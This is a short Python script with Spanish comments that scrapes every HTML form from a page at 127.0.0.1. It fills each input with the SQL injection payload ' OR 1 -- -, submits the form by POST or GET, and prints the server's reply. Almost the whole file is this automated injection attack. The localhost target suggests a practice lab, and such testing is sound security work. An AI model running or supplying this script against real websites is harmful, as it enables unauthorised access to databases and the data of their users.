import requests
from bs4 import BeautifulSoup

# Dirección IP de la URL
url = "http://127.0.0.1"

# Envía una solicitud GET a la URL
response = requests.get(url)

# Crea un objeto BeautifulSoup para procesar el HTML
soup = BeautifulSoup(response.text, "html.parser")

# Encuentra todos los elementos "form" en la página
forms = soup.find_all("form")

# Recorre cada formulario encontrado
for form in forms:
    print("Atributos del formulario:")
    print(form.attrs)

    # Obtiene el valor del atributo "action" y "method" del formulario
    form_action = form.attrs.get("action", "")
    form_method = form.attrs.get("method", "get").lower()
    
    # Encuentra todos los elementos "input" en el formulario
    inputs = form.find_all("input")
    form_data = {}
    # Recorre cada input y agrega su nombre y valor a un diccionario
    for input_tag in inputs:
        input_name = input_tag.attrs.get("name", "")
        input_value = input_tag.attrs.get("value", "")
        form_data[input_name] = input_value
    
    # Modificación para utilizar la cadena "' OR 1 -- -"
    for key in form_data:
        form_data[key] = "' OR 1 -- -"
    
    # Envía una solicitud POST o GET, dependiendo del método del formulario
    if form_method == "post":
        response = requests.post(form_action, data=form_data)
    else:
        response = requests.get(form_action, params=form_data)
        
    print("Respuesta de la solicitud:")
    print(response.text)
